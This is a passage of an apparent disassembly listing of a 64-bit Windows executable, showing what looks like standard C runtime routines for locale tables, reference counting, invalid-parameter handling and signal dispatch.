   1400055cd:	eb 12                	jmp    0x1400055e1
   1400055cf:	41 83 f8 19          	cmp    $0x19,%r8d
   1400055d3:	77 0a                	ja     0x1400055df
   1400055d5:	80 4c 0b 18 20       	orb    $0x20,0x18(%rbx,%rcx,1)
   1400055da:	8d 42 e0             	lea    -0x20(%rdx),%eax
   1400055dd:	eb 02                	jmp    0x1400055e1
   1400055df:	32 c0                	xor    %al,%al
   1400055e1:	88 84 0b 18 01 00 00 	mov    %al,0x118(%rbx,%rcx,1)
   1400055e8:	ff c2                	inc    %edx
   1400055ea:	48 ff c1             	inc    %rcx
   1400055ed:	3b d6                	cmp    %esi,%edx
   1400055ef:	72 c7                	jb     0x1400055b8
   1400055f1:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   1400055f8:	48 33 cc             	xor    %rsp,%rcx
   1400055fb:	e8 20 bd ff ff       	call   0x140001320
   140005600:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   140005607:	00 
   140005608:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   14000560c:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140005610:	49 8b e3             	mov    %r11,%rsp
   140005613:	5d                   	pop    %rbp
   140005614:	c3                   	ret
   140005615:	cc                   	int3
   140005616:	cc                   	int3
   140005617:	cc                   	int3
   140005618:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000561d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005622:	57                   	push   %rdi
   140005623:	48 83 ec 20          	sub    $0x20,%rsp
   140005627:	49 8b f9             	mov    %r9,%rdi
   14000562a:	49 8b d8             	mov    %r8,%rbx
   14000562d:	8b 0a                	mov    (%rdx),%ecx
   14000562f:	e8 ac ed ff ff       	call   0x1400043e0
   140005634:	90                   	nop
   140005635:	48 8b 03             	mov    (%rbx),%rax
   140005638:	48 8b 08             	mov    (%rax),%rcx
   14000563b:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140005642:	48 83 c0 18          	add    $0x18,%rax
   140005646:	48 8b 0d ab 34 01 00 	mov    0x134ab(%rip),%rcx        # 0x140018af8
   14000564d:	48 85 c9             	test   %rcx,%rcx
   140005650:	74 6f                	je     0x1400056c1
   140005652:	48 85 c0             	test   %rax,%rax
   140005655:	74 5d                	je     0x1400056b4
   140005657:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000565d:	45 8b c8             	mov    %r8d,%r9d
   140005660:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140005664:	0f 10 00             	movups (%rax),%xmm0
   140005667:	0f 11 01             	movups %xmm0,(%rcx)
   14000566a:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000566e:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140005672:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140005676:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   14000567a:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   14000567e:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140005682:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140005686:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   14000568a:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   14000568e:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140005692:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140005696:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   14000569a:	48 03 ca             	add    %rdx,%rcx
   14000569d:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1400056a1:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1400056a5:	48 03 c2             	add    %rdx,%rax
   1400056a8:	49 83 e9 01          	sub    $0x1,%r9
   1400056ac:	75 b6                	jne    0x140005664
   1400056ae:	8a 00                	mov    (%rax),%al
   1400056b0:	88 01                	mov    %al,(%rcx)
   1400056b2:	eb 27                	jmp    0x1400056db
   1400056b4:	33 d2                	xor    %edx,%edx
   1400056b6:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400056bc:	e8 6f cc ff ff       	call   0x140002330
   1400056c1:	e8 36 0c 00 00       	call   0x1400062fc
   1400056c6:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400056cc:	e8 ff 01 00 00       	call   0x1400058d0
   1400056d1:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400056d7:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   1400056db:	48 8b 03             	mov    (%rbx),%rax
   1400056de:	48 8b 08             	mov    (%rax),%rcx
   1400056e1:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   1400056e8:	48 05 19 01 00 00    	add    $0x119,%rax
   1400056ee:	48 8b 0d 0b 34 01 00 	mov    0x1340b(%rip),%rcx        # 0x140018b00
   1400056f5:	48 85 c9             	test   %rcx,%rcx
   1400056f8:	74 5e                	je     0x140005758
   1400056fa:	48 85 c0             	test   %rax,%rax
   1400056fd:	74 4c                	je     0x14000574b
   1400056ff:	0f 10 00             	movups (%rax),%xmm0
   140005702:	0f 11 01             	movups %xmm0,(%rcx)
   140005705:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005709:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   14000570d:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140005711:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140005715:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140005719:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   14000571d:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140005721:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140005725:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140005729:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   14000572d:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140005731:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140005735:	48 03 ca             	add    %rdx,%rcx
   140005738:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   14000573c:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140005740:	48 03 c2             	add    %rdx,%rax
   140005743:	49 83 e8 01          	sub    $0x1,%r8
   140005747:	75 b6                	jne    0x1400056ff
   140005749:	eb 1d                	jmp    0x140005768
   14000574b:	33 d2                	xor    %edx,%edx
   14000574d:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140005753:	e8 d8 cb ff ff       	call   0x140002330
   140005758:	e8 9f 0b 00 00       	call   0x1400062fc
   14000575d:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005763:	e8 68 01 00 00       	call   0x1400058d0
   140005768:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000576c:	48 8b 08             	mov    (%rax),%rcx
   14000576f:	48 8b 11             	mov    (%rcx),%rdx
   140005772:	83 c8 ff             	or     $0xffffffff,%eax
   140005775:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   140005779:	83 f8 01             	cmp    $0x1,%eax
   14000577c:	75 1b                	jne    0x140005799
   14000577e:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140005782:	48 8b 08             	mov    (%rax),%rcx
   140005785:	48 8d 05 e4 18 01 00 	lea    0x118e4(%rip),%rax        # 0x140017070
   14000578c:	48 39 01             	cmp    %rax,(%rcx)
   14000578f:	74 08                	je     0x140005799
   140005791:	48 8b 09             	mov    (%rcx),%rcx
   140005794:	e8 3b 00 00 00       	call   0x1400057d4
   140005799:	48 8b 03             	mov    (%rbx),%rax
   14000579c:	48 8b 10             	mov    (%rax),%rdx
   14000579f:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400057a3:	48 8b 08             	mov    (%rax),%rcx
   1400057a6:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   1400057ad:	48 89 01             	mov    %rax,(%rcx)
   1400057b0:	48 8b 03             	mov    (%rbx),%rax
   1400057b3:	48 8b 08             	mov    (%rax),%rcx
   1400057b6:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   1400057bd:	f0 ff 00             	lock incl (%rax)
   1400057c0:	8b 0f                	mov    (%rdi),%ecx
   1400057c2:	e8 35 ec ff ff       	call   0x1400043fc
   1400057c7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400057cc:	48 83 c4 20          	add    $0x20,%rsp
   1400057d0:	5f                   	pop    %rdi
   1400057d1:	c3                   	ret
   1400057d2:	cc                   	int3
   1400057d3:	cc                   	int3
   1400057d4:	48 85 c9             	test   %rcx,%rcx
   1400057d7:	74 37                	je     0x140005810
   1400057d9:	53                   	push   %rbx
   1400057da:	48 83 ec 20          	sub    $0x20,%rsp
   1400057de:	4c 8b c1             	mov    %rcx,%r8
   1400057e1:	33 d2                	xor    %edx,%edx
   1400057e3:	48 8b 0d fe 2e 01 00 	mov    0x12efe(%rip),%rcx        # 0x1400186e8
   1400057ea:	ff 15 78 00 01 00    	call   *0x10078(%rip)        # 0x140015868
   1400057f0:	85 c0                	test   %eax,%eax
   1400057f2:	75 17                	jne    0x14000580b
   1400057f4:	e8 03 0b 00 00       	call   0x1400062fc
   1400057f9:	48 8b d8             	mov    %rax,%rbx
   1400057fc:	ff 15 06 00 01 00    	call   *0x10006(%rip)        # 0x140015808
   140005802:	8b c8                	mov    %eax,%ecx
   140005804:	e8 83 0b 00 00       	call   0x14000638c
   140005809:	89 03                	mov    %eax,(%rbx)
   14000580b:	48 83 c4 20          	add    $0x20,%rsp
   14000580f:	5b                   	pop    %rbx
   140005810:	c3                   	ret
   140005811:	cc                   	int3
   140005812:	cc                   	int3
   140005813:	cc                   	int3
   140005814:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005819:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000581e:	57                   	push   %rdi
   14000581f:	48 83 ec 20          	sub    $0x20,%rsp
   140005823:	48 8b f2             	mov    %rdx,%rsi
   140005826:	48 8b f9             	mov    %rcx,%rdi
   140005829:	48 3b ca             	cmp    %rdx,%rcx
   14000582c:	74 54                	je     0x140005882
   14000582e:	48 8b d9             	mov    %rcx,%rbx
   140005831:	48 8b 03             	mov    (%rbx),%rax
   140005834:	48 85 c0             	test   %rax,%rax
   140005837:	74 0a                	je     0x140005843
   140005839:	ff 15 d1 47 01 00    	call   *0x147d1(%rip)        # 0x14001a010
   14000583f:	84 c0                	test   %al,%al
   140005841:	74 09                	je     0x14000584c
   140005843:	48 83 c3 10          	add    $0x10,%rbx
   140005847:	48 3b de             	cmp    %rsi,%rbx
   14000584a:	75 e5                	jne    0x140005831
   14000584c:	48 3b de             	cmp    %rsi,%rbx
   14000584f:	74 31                	je     0x140005882
   140005851:	48 3b df             	cmp    %rdi,%rbx
   140005854:	74 28                	je     0x14000587e
   140005856:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   14000585a:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   14000585f:	74 10                	je     0x140005871
   140005861:	48 8b 03             	mov    (%rbx),%rax
   140005864:	48 85 c0             	test   %rax,%rax
   140005867:	74 08                	je     0x140005871
   140005869:	33 c9                	xor    %ecx,%ecx
   14000586b:	ff 15 9f 47 01 00    	call   *0x1479f(%rip)        # 0x14001a010
   140005871:	48 83 eb 10          	sub    $0x10,%rbx
   140005875:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140005879:	48 3b c7             	cmp    %rdi,%rax
   14000587c:	75 dc                	jne    0x14000585a
   14000587e:	32 c0                	xor    %al,%al
   140005880:	eb 02                	jmp    0x140005884
   140005882:	b0 01                	mov    $0x1,%al
   140005884:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005889:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000588e:	48 83 c4 20          	add    $0x20,%rsp
   140005892:	5f                   	pop    %rdi
   140005893:	c3                   	ret
   140005894:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005899:	57                   	push   %rdi
   14000589a:	48 83 ec 20          	sub    $0x20,%rsp
   14000589e:	48 8b da             	mov    %rdx,%rbx
   1400058a1:	48 8b f9             	mov    %rcx,%rdi
   1400058a4:	48 3b ca             	cmp    %rdx,%rcx
   1400058a7:	74 1a                	je     0x1400058c3
   1400058a9:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400058ad:	48 85 c0             	test   %rax,%rax
   1400058b0:	74 08                	je     0x1400058ba
   1400058b2:	33 c9                	xor    %ecx,%ecx
   1400058b4:	ff 15 56 47 01 00    	call   *0x14756(%rip)        # 0x14001a010
   1400058ba:	48 83 eb 10          	sub    $0x10,%rbx
   1400058be:	48 3b df             	cmp    %rdi,%rbx
   1400058c1:	75 e6                	jne    0x1400058a9
   1400058c3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400058c8:	b0 01                	mov    $0x1,%al
   1400058ca:	48 83 c4 20          	add    $0x20,%rsp
   1400058ce:	5f                   	pop    %rdi
   1400058cf:	c3                   	ret
   1400058d0:	48 83 ec 38          	sub    $0x38,%rsp
   1400058d4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400058da:	45 33 c9             	xor    %r9d,%r9d
   1400058dd:	45 33 c0             	xor    %r8d,%r8d
   1400058e0:	33 d2                	xor    %edx,%edx
   1400058e2:	33 c9                	xor    %ecx,%ecx
   1400058e4:	e8 b3 01 00 00       	call   0x140005a9c
   1400058e9:	48 83 c4 38          	add    $0x38,%rsp
   1400058ed:	c3                   	ret
   1400058ee:	cc                   	int3
   1400058ef:	cc                   	int3
   1400058f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400058f4:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400058f9:	ff 15 99 ff 00 00    	call   *0xff99(%rip)        # 0x140015898
   1400058ff:	85 c0                	test   %eax,%eax
   140005901:	74 07                	je     0x14000590a
   140005903:	b9 05 00 00 00       	mov    $0x5,%ecx
   140005908:	cd 29                	int    $0x29
   14000590a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005910:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140005915:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140005919:	e8 1a 00 00 00       	call   0x140005938
   14000591e:	ff 15 bc fe 00 00    	call   *0xfebc(%rip)        # 0x1400157e0
   140005924:	48 8b c8             	mov    %rax,%rcx
   140005927:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   14000592c:	48 83 c4 28          	add    $0x28,%rsp
   140005930:	48 ff 25 e9 ff 00 00 	rex.W jmp *0xffe9(%rip)        # 0x140015920
   140005937:	cc                   	int3
   140005938:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000593d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005942:	55                   	push   %rbp
   140005943:	57                   	push   %rdi
   140005944:	41 56                	push   %r14
   140005946:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   14000594d:	ff 
   14000594e:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   140005955:	48 8b 05 dc 16 01 00 	mov    0x116dc(%rip),%rax        # 0x140017038
   14000595c:	48 33 c4             	xor    %rsp,%rax
   14000595f:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   140005966:	41 8b f8             	mov    %r8d,%edi
   140005969:	8b f2                	mov    %edx,%esi
   14000596b:	8b d9                	mov    %ecx,%ebx
   14000596d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005970:	74 05                	je     0x140005977
   140005972:	e8 49 c2 ff ff       	call   0x140001bc0
   140005977:	33 d2                	xor    %edx,%edx
   140005979:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000597e:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140005984:	e8 a7 c9 ff ff       	call   0x140002330
   140005989:	33 d2                	xor    %edx,%edx
   14000598b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000598f:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140005995:	e8 96 c9 ff ff       	call   0x140002330
   14000599a:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   14000599f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400059a4:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400059a8:	48 8d 45 10          	lea    0x10(%rbp),%rax
   1400059ac:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400059b1:	ff 15 21 ff 00 00    	call   *0xff21(%rip)        # 0x1400158d8
   1400059b7:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   1400059be:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400059c3:	49 8b ce             	mov    %r14,%rcx
   1400059c6:	45 33 c0             	xor    %r8d,%r8d
   1400059c9:	ff 15 11 ff 00 00    	call   *0xff11(%rip)        # 0x1400158e0
   1400059cf:	48 85 c0             	test   %rax,%rax
   1400059d2:	74 36                	je     0x140005a0a
   1400059d4:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400059da:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400059df:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1400059e4:	4c 8b c8             	mov    %rax,%r9
   1400059e7:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400059ec:	4d 8b c6             	mov    %r14,%r8
   1400059ef:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400059f4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400059f9:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400059fd:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005a02:	33 c9                	xor    %ecx,%ecx
   140005a04:	ff 15 e6 fe 00 00    	call   *0xfee6(%rip)        # 0x1400158f0
   140005a0a:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140005a11:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   140005a18:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140005a1f:	48 83 c0 08          	add    $0x8,%rax
   140005a23:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140005a27:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140005a2e:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140005a35:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140005a39:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140005a3d:	ff 15 4d fe 00 00    	call   *0xfe4d(%rip)        # 0x140015890
   140005a43:	33 c9                	xor    %ecx,%ecx
   140005a45:	8b f8                	mov    %eax,%edi
   140005a47:	ff 15 cb fe 00 00    	call   *0xfecb(%rip)        # 0x140015918
   140005a4d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140005a52:	ff 15 f0 fe 00 00    	call   *0xfef0(%rip)        # 0x140015948
   140005a58:	85 c0                	test   %eax,%eax
   140005a5a:	75 10                	jne    0x140005a6c
   140005a5c:	85 ff                	test   %edi,%edi
   140005a5e:	75 0c                	jne    0x140005a6c
   140005a60:	83 fb ff             	cmp    $0xffffffff,%ebx
   140005a63:	74 07                	je     0x140005a6c
   140005a65:	8b cb                	mov    %ebx,%ecx
   140005a67:	e8 54 c1 ff ff       	call   0x140001bc0
   140005a6c:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   140005a73:	48 33 cc             	xor    %rsp,%rcx
   140005a76:	e8 a5 b8 ff ff       	call   0x140001320
   140005a7b:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   140005a82:	00 
   140005a83:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140005a87:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140005a8b:	49 8b e3             	mov    %r11,%rsp
   140005a8e:	41 5e                	pop    %r14
   140005a90:	5f                   	pop    %rdi
   140005a91:	5d                   	pop    %rbp
   140005a92:	c3                   	ret
   140005a93:	cc                   	int3
   140005a94:	48 89 0d 7d 30 01 00 	mov    %rcx,0x1307d(%rip)        # 0x140018b18
   140005a9b:	c3                   	ret
   140005a9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005aa1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005aa6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005aab:	57                   	push   %rdi
   140005aac:	48 83 ec 30          	sub    $0x30,%rsp
   140005ab0:	41 8b d9             	mov    %r9d,%ebx
   140005ab3:	49 8b f8             	mov    %r8,%rdi
   140005ab6:	48 8b f2             	mov    %rdx,%rsi
   140005ab9:	48 8b e9             	mov    %rcx,%rbp
   140005abc:	e8 5b eb ff ff       	call   0x14000461c
   140005ac1:	48 85 c0             	test   %rax,%rax
   140005ac4:	74 3d                	je     0x140005b03
   140005ac6:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   140005acd:	48 85 c0             	test   %rax,%rax
   140005ad0:	74 31                	je     0x140005b03
   140005ad2:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140005ad7:	44 8b cb             	mov    %ebx,%r9d
   140005ada:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140005adf:	4c 8b c7             	mov    %rdi,%r8
   140005ae2:	48 8b d6             	mov    %rsi,%rdx
   140005ae5:	48 8b cd             	mov    %rbp,%rcx
   140005ae8:	ff 15 22 45 01 00    	call   *0x14522(%rip)        # 0x14001a010
   140005aee:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005af3:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140005af8:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005afd:	48 83 c4 30          	add    $0x30,%rsp
   140005b01:	5f                   	pop    %rdi
   140005b02:	c3                   	ret
   140005b03:	4c 8b 15 2e 15 01 00 	mov    0x1152e(%rip),%r10        # 0x140017038
   140005b0a:	44 8b cb             	mov    %ebx,%r9d
   140005b0d:	41 8b ca             	mov    %r10d,%ecx
   140005b10:	4c 8b c7             	mov    %rdi,%r8
   140005b13:	4c 33 15 fe 2f 01 00 	xor    0x12ffe(%rip),%r10        # 0x140018b18
   140005b1a:	83 e1 3f             	and    $0x3f,%ecx
   140005b1d:	49 d3 ca             	ror    %cl,%r10
   140005b20:	48 8b d6             	mov    %rsi,%rdx
   140005b23:	4d 85 d2             	test   %r10,%r10
   140005b26:	74 0f                	je     0x140005b37
   140005b28:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140005b2d:	49 8b c2             	mov    %r10,%rax
   140005b30:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005b35:	eb ae                	jmp    0x140005ae5
   140005b37:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140005b3c:	48 8b cd             	mov    %rbp,%rcx
   140005b3f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005b44:	e8 a7 fd ff ff       	call   0x1400058f0
   140005b49:	cc                   	int3
   140005b4a:	cc                   	int3
   140005b4b:	cc                   	int3
   140005b4c:	40 53                	rex push %rbx
   140005b4e:	48 83 ec 20          	sub    $0x20,%rsp
   140005b52:	48 8b d9             	mov    %rcx,%rbx
   140005b55:	e8 2a 00 00 00       	call   0x140005b84
   140005b5a:	48 85 c0             	test   %rax,%rax
   140005b5d:	74 14                	je     0x140005b73
   140005b5f:	48 8b cb             	mov    %rbx,%rcx
   140005b62:	ff 15 a8 44 01 00    	call   *0x144a8(%rip)        # 0x14001a010
   140005b68:	85 c0                	test   %eax,%eax
   140005b6a:	74 07                	je     0x140005b73
   140005b6c:	b8 01 00 00 00       	mov    $0x1,%eax
   140005b71:	eb 02                	jmp    0x140005b75
   140005b73:	33 c0                	xor    %eax,%eax
   140005b75:	48 83 c4 20          	add    $0x20,%rsp
   140005b79:	5b                   	pop    %rbx
   140005b7a:	c3                   	ret
   140005b7b:	cc                   	int3
   140005b7c:	48 89 0d 9d 2f 01 00 	mov    %rcx,0x12f9d(%rip)        # 0x140018b20
   140005b83:	c3                   	ret
   140005b84:	40 53                	rex push %rbx
   140005b86:	48 83 ec 20          	sub    $0x20,%rsp
   140005b8a:	33 c9                	xor    %ecx,%ecx
   140005b8c:	e8 4f e8 ff ff       	call   0x1400043e0
   140005b91:	90                   	nop
   140005b92:	48 8b 1d 9f 14 01 00 	mov    0x1149f(%rip),%rbx        # 0x140017038
   140005b99:	8b cb                	mov    %ebx,%ecx
   140005b9b:	83 e1 3f             	and    $0x3f,%ecx
   140005b9e:	48 33 1d 7b 2f 01 00 	xor    0x12f7b(%rip),%rbx        # 0x140018b20
   140005ba5:	48 d3 cb             	ror    %cl,%rbx
   140005ba8:	33 c9                	xor    %ecx,%ecx
   140005baa:	e8 4d e8 ff ff       	call   0x1400043fc
   140005baf:	48 8b c3             	mov    %rbx,%rax
   140005bb2:	48 83 c4 20          	add    $0x20,%rsp
   140005bb6:	5b                   	pop    %rbx
   140005bb7:	c3                   	ret
   140005bb8:	48 89 0d 69 2f 01 00 	mov    %rcx,0x12f69(%rip)        # 0x140018b28
   140005bbf:	48 89 0d 6a 2f 01 00 	mov    %rcx,0x12f6a(%rip)        # 0x140018b30
   140005bc6:	48 89 0d 6b 2f 01 00 	mov    %rcx,0x12f6b(%rip)        # 0x140018b38
   140005bcd:	48 89 0d 6c 2f 01 00 	mov    %rcx,0x12f6c(%rip)        # 0x140018b40
   140005bd4:	c3                   	ret
   140005bd5:	cc                   	int3
   140005bd6:	cc                   	int3
   140005bd7:	cc                   	int3
   140005bd8:	4c 8b dc             	mov    %rsp,%r11
   140005bdb:	48 83 ec 28          	sub    $0x28,%rsp
   140005bdf:	b8 03 00 00 00       	mov    $0x3,%eax
   140005be4:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140005be8:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140005bec:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140005bf0:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140005bf4:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140005bf8:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140005bfc:	e8 73 02 00 00       	call   0x140005e74
   140005c01:	48 83 c4 28          	add    $0x28,%rsp
   140005c05:	c3                   	ret
   140005c06:	cc                   	int3
   140005c07:	cc                   	int3
   140005c08:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005c0d:	56                   	push   %rsi
   140005c0e:	57                   	push   %rdi
   140005c0f:	41 54                	push   %r12
   140005c11:	41 55                	push   %r13
   140005c13:	41 56                	push   %r14
   140005c15:	48 83 ec 40          	sub    $0x40,%rsp
   140005c19:	8b d9                	mov    %ecx,%ebx
   140005c1b:	45 33 ed             	xor    %r13d,%r13d
   140005c1e:	44 21 6c 24 78       	and    %r13d,0x78(%rsp)
   140005c23:	41 b6 01             	mov    $0x1,%r14b
   140005c26:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140005c2b:	83 f9 02             	cmp    $0x2,%ecx
   140005c2e:	74 21                	je     0x140005c51
   140005c30:	83 f9 04             	cmp    $0x4,%ecx
   140005c33:	74 4c                	je     0x140005c81
   140005c35:	83 f9 06             	cmp    $0x6,%ecx
   140005c38:	74 17                	je     0x140005c51
   140005c3a:	83 f9 08             	cmp    $0x8,%ecx
   140005c3d:	74 42                	je     0x140005c81
   140005c3f:	83 f9 0b             	cmp    $0xb,%ecx
   140005c42:	74 3d                	je     0x140005c81
   140005c44:	83 f9 0f             	cmp    $0xf,%ecx
   140005c47:	74 08                	je     0x140005c51
   140005c49:	8d 41 eb             	lea    -0x15(%rcx),%eax
   140005c4c:	83 f8 01             	cmp    $0x1,%eax
   140005c4f:	77 7d                	ja     0x140005cce
   140005c51:	83 e9 02             	sub    $0x2,%ecx
   140005c54:	0f 84 af 00 00 00    	je     0x140005d09
   140005c5a:	83 e9 04             	sub    $0x4,%ecx
   140005c5d:	0f 84 8b 00 00 00    	je     0x140005cee
   140005c63:	83 e9 09             	sub    $0x9,%ecx
   140005c66:	0f 84 94 00 00 00    	je     0x140005d00
   140005c6c:	83 e9 06             	sub    $0x6,%ecx
   140005c6f:	0f 84 82 00 00 00    	je     0x140005cf7
   140005c75:	83 f9 01             	cmp    $0x1,%ecx
   140005c78:	74 74                	je     0x140005cee
   140005c7a:	33 ff                	xor    %edi,%edi
   140005c7c:	e9 8f 00 00 00       	jmp    0x140005d10
   140005c81:	e8 96 e9 ff ff       	call   0x14000461c
   140005c86:	4c 8b e8             	mov    %rax,%r13
   140005c89:	48 85 c0             	test   %rax,%rax
   140005c8c:	75 18                	jne    0x140005ca6
   140005c8e:	83 c8 ff             	or     $0xffffffff,%eax
   140005c91:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   140005c98:	00 
   140005c99:	48 83 c4 40          	add    $0x40,%rsp
   140005c9d:	41 5e                	pop    %r14
   140005c9f:	41 5d                	pop    %r13
   140005ca1:	41 5c                	pop    %r12
   140005ca3:	5f                   	pop    %rdi
   140005ca4:	5e                   	pop    %rsi
   140005ca5:	c3                   	ret
   140005ca6:	48 8b 00             	mov    (%rax),%rax
   140005ca9:	48 8b 0d 80 86 00 00 	mov    0x8680(%rip),%rcx        # 0x14000e330
   140005cb0:	48 c1 e1 04          	shl    $0x4,%rcx
   140005cb4:	48 03 c8             	add    %rax,%rcx
   140005cb7:	eb 09                	jmp    0x140005cc2
   140005cb9:	39 58 04             	cmp    %ebx,0x4(%rax)
   140005cbc:	74 0b                	je     0x140005cc9
   140005cbe:	48 83 c0 10          	add    $0x10,%rax
   140005cc2:	48 3b c1             	cmp    %rcx,%rax
   140005cc5:	75 f2                	jne    0x140005cb9
